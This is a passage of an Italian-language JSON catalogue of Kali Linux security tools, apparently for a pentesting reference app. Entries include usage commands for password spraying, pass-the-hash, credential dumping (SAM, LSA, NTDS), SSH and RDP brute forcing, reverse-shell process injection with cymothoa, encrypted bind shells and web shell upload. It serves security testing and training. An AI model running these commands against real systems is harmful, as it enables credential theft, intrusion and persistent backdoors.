    "id": "crackle",
    "name": "crackle",
    "version": "0.1~git01282014",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crackle/",
    "desc": "Cracca pairing BLE (Bluetooth Low Energy) e decripta traffico catturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Crackle</strong> sfrutta una vulnerabilità nel processo di pairing Bluetooth Low Energy (BLE) per recuperare la chiave di cifratura e decrittare il traffico catturato. Il pairing BLE Legacy usa una Temporary Key (TK) a 6 cifre che può essere bruteforzata in meno di un secondo, permettendo di decifrare tutto il traffico successivo tra i dispositivi paired.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TK Cracking:</strong> Bruteforce della Temporary Key a 6 cifre usata nel Legacy Pairing BLE (1 milione di combinazioni).</p><p><strong>STK/LTK Recovery:</strong> Dalla TK, deriva Short Term Key e Long Term Key per decifrare sessioni correnti e future.</p><p><strong>Traffic Decryption:</strong> Decripta il traffico BLE catturato in formato pcap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crack da cattura pcap con pairing\ncrackle -i capture.pcap -o decrypted.pcap\n\n# Con TK nota\ncrackle -i capture.pcap -o decrypted.pcap -t 123456</code></pre><p>Richiede la cattura del processo di pairing completo (LE Pairing Request/Response e Pairing Confirm).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>IoT Security</strong>, testa la sicurezza del pairing di dispositivi smart (fitness tracker, smartwatch, serrature).</p><p>Per <strong>Research</strong>, analizza protocolli proprietari over BLE dopo aver decifrato il traffico. Dimostra le debolezze del Legacy Pairing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> BLE Secure Connections (pairing moderno) usa ECDH e non è vulnerabile. Richiede cattura del pairing iniziale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "crackmapexec",
    "name": "crackmapexec",
    "version": "5.4.0",
    "icon": "../app/icons/crackmapexec-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crackmapexec/",
    "desc": "Post-exploitation tool per reti Windows: SMB, WMI, MSSQL, LDAP, spray, relay.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CrackMapExec</strong> (CME) è il coltellino svizzero per il post-exploitation in ambienti Windows/Active Directory. Un singolo tool che supporta SMB, WinRM, LDAP, MSSQL, SSH e RDP per enumerazione, password spraying, esecuzione remota e lateral movement. È lo strumento preferito per 'owned one, pwn them all' - partendo da una credenziale, compromettere l'intera rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Spraying:</strong> Testa credenziali contro molti host simultaneamente identificando dove sono valide.</p><p><strong>Credential Dumping:</strong> Estrae hash SAM, LSA secrets e credenziali cached via SMB/WMI.</p><p><strong>Remote Execution:</strong> Esegue comandi remoti via WMI, SMBExec, PSExec, WinRM senza lasciare file.</p><p><strong>Module System:</strong> Centinaia di moduli per task specifici (Mimikatz, BloodHound collection, GPP passwords).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Password spray evitando lockout (1 password per ciclo)\ncrackmapexec smb targets.txt -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success\n\n# Pass-the-hash su intera subnet\ncrackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435:31d6cfe0d16ae931' --local-auth\n\n# Dump credenziali completo (SAM + LSA + NTDS se DC)\ncrackmapexec smb dc01.domain.local -u admin -p pass --sam --lsa --ntds\n\n# Esecuzione fileless con output\ncrackmapexec smb 192.168.1.10 -u admin -p pass -X 'Get-Process | Select Name,Id'\n\n# Module chaining: enum -&gt; exploit\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M spider_plus  # cerca file sensibili\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M gpp_password  # GPP creds\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M lsassy  # dump remoto\n\n# LDAP per BloodHound collection\ncrackmapexec ldap dc01 -u user -p pass -M bloodhound --collection All\n\n# MSSQL per command execution via xp_cmdshell\ncrackmapexec mssql sql01 -u sa -p 'Password123!' -x 'whoami'\n\n# WinRM per sessione interattiva\ncrackmapexec winrm 192.168.1.10 -u admin -p pass -X '$env:COMPUTERNAME'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>essenziale</strong> in ogni AD pentest. Password spraying identifica credenziali riutilizzate. Lateral movement massivo con credenziali compromesse. L'output colorato mostra immediatamente dove le credenziali funzionano (Pwn3d!).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le tecniche sono note e monitorate. Password spray genera login falliti. L'uso dei moduli (Mimikatz) triggera EDR.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "creddump7",
    "name": "creddump7",
    "version": "0.1",
    "icon": "../app/icons/creddump7-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/creddump7/",
    "desc": "Estrae hash e credenziali cached da registry hive Windows (SAM, SYSTEM).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Creddump7</strong> è un insieme di script Python per estrarre credenziali da file registry Windows (SAM, SYSTEM, SECURITY) ottenuti offline. Recupera hash NTLM degli account locali, LSA secrets (password servizi, auto-logon) e domain cached credentials (DCC/MSCache) che possono essere craccate offline per ottenere password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>pwdump:</strong> Estrae hash NTLM dal file SAM per tutti gli account locali.</p><p><strong>cachedump:</strong> Estrae Domain Cached Credentials dal file SECURITY per utenti di dominio che hanno fatto login.</p><p><strong>lsadump:</strong> Estrae LSA Secrets contenenti password di servizi, VPN e altri segreti memorizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump hash locali (richiede SAM e SYSTEM)\npwdump.py /mnt/windows/System32/config/SYSTEM /mnt/windows/System32/config/SAM\n\n# Dump cached credentials (richiede SYSTEM e SECURITY)\ncachedump.py /mnt/windows/System32/config/SYSTEM /mnt/windows/System32/config/SECURITY\n\n# Dump LSA secrets\nlsadump.py /mnt/windows/System32/config/SYSTEM /mnt/windows/System32/config/SECURITY</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Offline Analysis</strong>, quando si hanno copie dei registry hive (backup, immagine forense, shadow copies).</p><p>Per <strong>Forensics</strong>, estrae credenziali da sistemi compromessi. Quando accesso live non è possibile ma si hanno i file.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti:</strong> Richiede accesso ai file registry. Su sistema live, copiare da shadow copies o usare tool come secretsdump.py.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "crowbar",
    "name": "crowbar",
    "version": "4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crowbar/",
    "desc": "Brute forcer per SSH, RDP, VNC, OpenVPN che supporta chiavi e password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Crowbar</strong> (precedentemente Levye) è un tool di brute force specializzato per protocolli che altri cracker non supportano bene. La sua caratteristica distintiva è il supporto per l'autenticazione con chiave SSH (non solo password) e l'attacco a RDP con NLA (Network Level Authentication). Supporta anche VNC e OpenVPN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SSH Key Brute Force:</strong> Testa chiavi private SSH rubate contro molti host per trovare dove funzionano.</p><p><strong>RDP NLA Support:</strong> Attacca Remote Desktop con Network Level Authentication, non supportato da Hydra.</p><p><strong>OpenVPN:</strong> Brute force di credenziali OpenVPN tramite file di configurazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force SSH con chiavi\ncrowbar -b sshkey -s 192.168.1.0/24 -u root -k /path/to/keys/\n\n# Brute force RDP\ncrowbar -b rdp -s 192.168.1.10 -u admin -C passwords.txt\n\n# VPN attack\ncrowbar -b openvpn -s 192.168.1.10 -c vpn.conf -u user -C pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando si trovano <strong>chiavi SSH</strong> su un sistema compromesso, Crowbar testa rapidamente dove funzionano nella rete.</p><p>Per <strong>RDP Brute Force</strong> moderno con NLA abilitato.</p><p>In ambienti con <strong>OpenVPN</strong>, testa credenziali rubate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come ogni brute forcer, genera molti tentativi di login falliti. Account lockout è possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "crunch",
    "name": "crunch",
    "version": "3.6",
    "icon": "../app/icons/crunch-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crunch/",
    "desc": "Genera wordlist con pattern, charset e lunghezze personalizzabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Crunch</strong> è un generatore di wordlist altamente configurabile che crea combinazioni di caratteri basate su pattern, charset e lunghezza specificati. A differenza di tool che usano wordlist esistenti, Crunch genera tutte le possibili combinazioni, permettendo attacchi brute force esaustivi o targetizzati con pattern conosciuti (es. password che iniziano con lettere e finiscono con numeri).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Length Range:</strong> Genera parole da una lunghezza minima a massima specificata.</p><p><strong>Charset Control:</strong> Usa charset predefiniti (alpha, numeric, symbols) o completamente personalizzati.</p><p><strong>Pattern Mode:</strong> Specifica pattern con placeholder (@ per lowercase, , per uppercase, % per numeri, ^ per simboli).</p><p><strong>Streaming:</strong> Può fare pipe diretto a tool di cracking senza salvare su disco (risparmio spazio).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pattern corporate: Nome + Anno + Simbolo\ncrunch 10 12 -t @@@@@@20%%^  # es: Summer2024!\n\n# WiFi: 8 cifre numeriche (PIN WPS o password)\ncrunch 8 8 0123456789 | aircrack-ng -w - capture.cap\n\n# Pipe diretta a hashcat (no file intermedio)\ncrunch 8 8 -t @@@@%%%% | hashcat -m 1000 hashes.txt\n\n# Charset ridotto basato su policy aziendale\ncrunch 8 12 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#' -o policy_wordlist.txt\n\n# Pattern con parola fissa + variazioni\ncrunch 10 10 -t Company%%^^ -o company_variations.txt\n\n# Limita output file per dimensione (split)\ncrunch 6 6 -b 100mb -o START passwords.txt\n\n# Combina con regole esterne\ncrunch 4 4 0123456789 | hashcat --stdout -r best64.rule &gt; mutations.txt\n\n# Resume da checkpoint\ncrunch 8 8 -s startword -e endword</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Targeted Attacks</strong> quando si conosce parzialmente la struttura della password (es. iniziali del nome + anno). In <strong>CTF</strong>, genera tutte le combinazioni di un charset limitato.</p><p>Per <strong>Policy Testing</strong>, verifica che password rispettino requisiti minimi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dimensioni:</strong> Wordlist esaustive possono essere enormi (terabyte). Usare pattern o pipe streaming per limitare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "cymothoa",
    "name": "cymothoa",
    "version": "1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cymothoa/",
    "desc": "Inietta shellcode in processi Linux attivi per backdoor in-memory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cymothoa</strong> è uno strumento di stealth backdooring per Linux che inietta shellcode in processi già in esecuzione. Il codice malevolo vive solo in memoria, senza creare nuovi processi o file su disco, rendendo la detection molto più difficile. Include diversi payload predefiniti (reverse shell, bind shell) iniettabili in processi scelti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Process Injection:</strong> Usa ptrace per iniettare shellcode in qualsiasi processo esistente.</p><p><strong>Multiple Payloads:</strong> Include payload per reverse shell, bind shell e altre funzionalità backdoor.</p><p><strong>Fileless:</strong> Non scrive nulla su disco, la backdoor esiste solo in memoria RAM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lista payload disponibili\ncymothoa -S\n\n# Injection reverse shell in processo\ncymothoa -p <PID> -s 1 -y <attacker_port>\n\n# Con IP attacker specificato\ncymothoa -p <PID> -s 0 -y <port> -x <attacker_ip></code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Post-Exploitation</strong>, crea backdoor persistenti (finché il processo target è vivo) senza toccare il filesystem.</p><p>Per <strong>Red Team</strong>, evita detection basata su file.</p><p>In <strong>Persistence</strong>, se il processo target è un demone, la backdoor sopravvive al reboot.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Anomalie in memoria possono essere rilevate. Il processo target potrebbe crashare se l'injection fallisce.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "davtest",
    "name": "davtest",
    "version": "1.2",
    "icon": "../app/icons/davtest-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/davtest/",
    "desc": "Testa server WebDAV per upload di file e verificare esecuzione codice.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DAVTest</strong> automatizza il testing di server WebDAV per identificare se è possibile uploadare file eseguibili e ottenerne l'esecuzione. Testa sistematicamente diversi tipi di file (asp, aspx, php, jsp, txt, html) per determinare quali vengono accettati e quali possono essere eseguiti, identificando potenziali vettori di compromissione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Upload Testing:</strong> Prova a caricare file con diverse estensioni per vedere quali sono permesse.</p><p><strong>Execution Testing:</strong> Dopo l'upload, tenta di eseguire i file per verificare se il server li processa come script.</p><p><strong>MOVE Testing:</strong> Testa se file uploadati come txt possono essere rinominati in estensioni eseguibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test base\ndavtest -url http://target.com/webdav/\n\n# Con credenziali\ndavtest -url http://target.com/webdav/ -auth user:pass\n\n# Upload shell dopo test\ndavtest -url http://target.com/webdav/ -uploadfile shell.aspx -uploadloc shell.aspx</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando <strong>Nmap o nikto</strong> identificano WebDAV abilitato, DAVTest determina automaticamente quali file possono essere uploadati.</p><p>Per <strong>IIS exploitation</strong>, WebDAV mal configurato è una vulnerabilità classica. Fase di reconnaissance prima dell'exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I file di test vengono uploadati e poi eliminati. Lascia tracce nei log WebDAV.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "dbd",
    "name": "dbd",
    "version": "1.50",
    "icon": "../app/icons/dbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dbd/",
    "desc": "Clone di netcat con crittografia AES e feature di evasione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DBD</strong> (Durandal's Backdoor) è un clone di netcat progettato per operazioni di red team. La differenza chiave è la crittografia AES-CBC-128 integrata che protegge tutto il traffico, rendendo difficile l'analisi del contenuto da parte di IDS/IPS. Include anche opzioni per respawning automatico della shell e detach dal terminale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES Encryption:</strong> Tutto il traffico è cifrato con AES-CBC-128 usando una shared key configurabile.</p><p><strong>Respawn:</strong> Può riavviare automaticamente la shell se la connessione cade.</p><p><strong>Stealth:</strong> Opzioni per detach, quiet mode e evasione di detection.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener con encryption\ndbd -l -p 4444 -e /bin/bash -k secretkey\n\n# Client connection\ndbd target.com 4444 -k secretkey\n\n# Bind shell con respawn\ndbd -l -p 4444 -r -e /bin/sh -k mykey</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reverse/Bind Shell</strong> quando il traffico netcat in chiaro verrebbe rilevato.</p><p>In <strong>Red Team</strong>, la crittografia evita analisi del payload. Come sostituto di netcat quando è necessaria confidenzialità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il traffico cifrato è anomalo e può essere flaggato. Pattern di connessione persistenti possono essere rilevati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "dc3dd",
    "name": "dc3dd",
    "version": "7.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dc3dd/",
    "desc": "Versione forense di dd con hashing on-the-fly, progress bar e split.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DC3DD</strong> è una versione potenziata del comando dd sviluppata dal Department of Defense Cyber Crime Center (DC3) per acquisizioni forensi. Aggiunge funzionalità essenziali per le indagini: hashing on-the-fly per verifica integrità, progress bar, split automatico in file più piccoli, logging dettagliato e wiping sicuro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>On-the-fly Hashing:</strong> Calcola MD5, SHA1, SHA256 durante la copia, verificando integrità senza passaggi aggiuntivi.</p><p><strong>Split Output:</strong> Divide automaticamente l'output in file di dimensione specificata (utile per limitazioni FAT32).</p><p><strong>Progress Indicator:</strong> Mostra avanzamento della copia in tempo reale.</p><p><strong>Logging:</strong> Genera log dettagliati dell'operazione per documentazione forense.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Acquisizione con hash MD5 e SHA256\ndc3dd if=/dev/sda of=disk.img hash=md5 hash=sha256 log=acquisition.log\n\n# Con split in file da 2GB\ndc3dd if=/dev/sda of=disk.img.000 ofsz=2G hash=md5\n\n# Wiping sicuro\ndc3dd wipe=/dev/sda</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard per <strong>Acquisizioni Forensi</strong> in indagini legali dove la catena di custodia è critica.</p><p>L'hashing simultaneo garantisce l'integrità senza rallentamenti. Per <strong>Incident Response</strong>, copia evidenze in modo forensicamente valido.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Usare write blocker hardware quando si acquisisce da evidence originale. Documentare tutti i parametri usati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "dcfldd",
    "name": "dcfldd",
    "version": "1.9.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dcfldd/",
    "desc": "Enhanced dd per forensics con hash multipli, progress e split output.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DCFLDD</strong> è un fork di GNU dd creato dal Department of Defense Computer Forensics Lab. Come dc3dd, aggiunge funzionalità forensi a dd: hashing on-the-fly, status output, verifica pattern, split output e capacità di scrivere su multipli output simultaneamente. È uno strumento consolidato nella community forense.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Outputs:</strong> Può scrivere contemporaneamente su file e dispositivi multipli (es. due copie forensi in parallelo).</p><p><strong>Hashing:</strong> Supporta MD5, SHA1, SHA256, SHA384, SHA512 durante la copia.</p><p><strong>Pattern Verify:</strong> Può verificare che un dispositivo contenga un pattern specifico (es. dopo wiping).</p><p><strong>Status Output:</strong> Progress bar e statistiche durante la copia.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Copia forense con hash\ndcfldd if=/dev/sda of=evidence.dd hash=md5,sha256 hashlog=hashes.txt\n\n# Output multipli\ndcfldd if=/dev/sda of=copy1.dd of=copy2.dd hash=md5\n\n# Verifica wipe\ndcfldd if=/dev/sda vf=/dev/zero</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Alternativa a dc3dd per <strong>Digital Forensics</strong>.</p><p>L'output multiplo è utile quando si devono creare più copie identiche simultaneamente. Per <strong>Data Wiping</strong> con verifica, garantisce che il wipe sia completo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scelta:</strong> dc3dd e dcfldd sono funzionalmente simili. Usare quello con cui si ha più familiarità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "detect-it-easy",
    "name": "detect-it-easy",
    "version": "3.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/detect-it-easy/",
    "desc": "Identifica packer, compilatori e protector su eseguibili PE, ELF, Mach-O.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Detect It Easy (DIE) è un programma per identificare il tipo di file, compilatore, linker, packer e protector usati per creare un eseguibile. Supporta PE (Windows), ELF (Linux), Mach-O (macOS) e molti altri formati. È essenziale nel reverse engineering per capire come approcciare l'analisi di un binario prima di aprirlo in IDA o Ghidra.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Compiler Detection:</strong> Identifica Visual Studio, GCC, Clang, Delphi, Go, Rust e molti altri.</p><p><strong>Packer Detection:</strong> Riconosce UPX, ASPack, Themida, VMProtect e centinaia di altri packer/protector.</p><p><strong>Deep Scan:</strong> Analisi euristica per identificare protezioni sconosciute.</p><p><strong>Scripting:</strong> Database di signature estendibile con script JavaScript.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi da CLI\ndiec malware.exe\n\n# Con output dettagliato\ndiec -d malware.exe\n\n# Analisi ricorsiva directory\ndiec -r /path/to/samples/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo in ogni <strong>Malware Analysis</strong> per determinare se il sample è packed (richiede unpacking prima dell'analisi).</p><p>Per <strong>CTF</strong>, identifica rapidamente il linguaggio/compilatore per orientare il reversing.</p><p>In <strong>Vulnerability Research</strong>, capire le protezioni prima di cercare bug.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi Statica:</strong> Tool passivo, non esegue il sample. Sicuro da usare su malware.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "dex2jar",
    "name": "dex2jar",
    "version": "2.1~nightly",
    "icon": "../app/icons/dex2jar-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dex2jar/",
    "desc": "Converte file DEX Android in JAR per analisi con decompiler Java.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dex2jar</strong> converte file Dalvik Executable (DEX) di Android in file JAR contenenti bytecode Java standard. Questa conversione permette di utilizzare i potenti decompilatori Java esistenti (JD-GUI, Procyon, CFR) per analizzare app Android, ottenendo codice sorgente più leggibile rispetto al formato smali nativo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DEX to JAR:</strong> Converte classes.dex in file JAR con classi Java.</p><p><strong>APK Support:</strong> Può estrarre e convertire direttamente da file APK.</p><p><strong>Batch Processing:</strong> Supporta conversione di multipli file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Conversione DEX a JAR\nd2j-dex2jar classes.dex -o output.jar\n\n# Direttamente da APK\nd2j-dex2jar app.apk -o app.jar\n\n# Poi analizzare con JD-GUI\njd-gui output.jar</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Mobile Security</strong>, workflow classico: APK → dex2jar → JD-GUI per vedere il codice Java.</p><p>Per <strong>Malware Analysis</strong> Android, facilita la comprensione della logica dell'app. Come passo intermedio prima dell'analisi con tool Java.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> jadx fa tutto in un passo (APK diretto a Java). dex2jar utile per workflow legacy o quando jadx ha problemi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "dirb",
    "name": "dirb",
    "version": "2.22",
    "icon": "../app/icons/dirb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirb/",
    "desc": "Web content scanner per directory e file nascosti tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DIRB</strong> è uno scanner web che trova directory e file nascosti tramite attacco a dizionario. Testa sistematicamente URL costruiti da una wordlist contro il server web, identificando risorse non linkate pubblicamente ma comunque accessibili. È uno dei tool classici per web content discovery, predecessore di gobuster e feroxbuster.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Prova ogni parola dalla wordlist come path sul server target.</p><p><strong>Extension Bruting:</strong> Può appendere estensioni (.php, .bak, .txt) a ogni path testato.</p><p><strong>Recursive Mode:</strong> Esplora ricorsivamente le directory trovate.</p><p><strong>Custom Headers:</strong> Supporta header custom, cookie e user agent.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione con wordlist medium e estensioni multiple\ndirb http://target.com/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -X .php,.asp,.aspx,.html,.bak,.old,.txt,.zip -o results.txt\n\n# Con header cookie per area autenticata\ndirb http://target.com/dashboard/ -H \"Cookie: session=abc123; auth=xyz\"\n\n# Ignorare warning SSL e timeout custom\ndirb https://target.com/ -w -t 120\n\n# User-agent custom per evasione\ndirb http://target.com/ -a \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\"\n\n# Non ricorsivo (più veloce)\ndirb http://target.com/ -r\n\n# Basic auth\ndirb http://target.com/protected/ -u admin:password\n\n# Pipeline con altri tool\ndirb http://target.com/ -o dirs.txt &amp;&amp; \\\n  grep \"=&gt; DIRECTORY\" dirs.txt | awk '{print $1}' | xargs -I{} dirb {} -X .php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per trovare <strong>Admin Panels</strong> nascosti (/admin, /manager, /wp-admin).</p><p>In <strong>Bug Bounty</strong>, scopre endpoint non documentati.</p><p>Per <strong>Backup Files</strong>, trova .bak, .old, .swp dimenticati che possono esporre codice sorgente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Velocità:</strong> Più lento di gobuster/feroxbuster. Traffico riconoscibile da WAF. Usare delay se necessario.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dirbuster",
    "name": "dirbuster",
    "version": "1.0",
    "icon": "../app/icons/dirbuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirbuster/",
    "desc": "GUI Java per brute force di directory e file web con threading.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DirBuster</strong> è un'applicazione Java multi-threaded per brute forcing di directory e nomi file su server web. Sviluppata da OWASP, offre un'interfaccia grafica che rende facile configurare e monitorare gli attacchi. Include wordlist estese e può generare path anche tramite fuzzing puro. È il predecessore dei moderni tool CLI come gobuster.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-threaded:</strong> Configurabile fino a 200+ thread simultanei per massima velocità.</p><p><strong>GUI:</strong> Interfaccia grafica per configurazione, monitoraggio progressivo e visualizzazione risultati.</p><p><strong>Built-in Wordlists:</strong> Include diverse wordlist di dimensioni crescenti, dalla piccola alla enorme.</p><p><strong>Brute Force Mode:</strong> Può generare tutte le combinazioni di caratteri invece di usare una wordlist.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio GUI\ndirbuster\n\n# Workflow:\n# 1. Inserire target URL\n# 2. Selezionare wordlist\n# 3. Configurare thread e estensioni\n# 4. Start e monitorare i risultati</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per chi preferisce <strong>interfacce grafiche</strong> a CLI.</p><p>La visualizzazione del progresso è utile per scan lunghi. Ancora usato in alcuni <strong>OSCP/certification</strong> workflow.</p><p>Buono per <strong>formazione</strong> e comprensione del concetto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> gobuster e feroxbuster sono più veloci e preferiti per uso professionale. DirBuster è più datato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/dirsearch-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirsearch/",
    "desc": "Brute forcer di directory web veloce con estensioni multiple e ricorsione.",
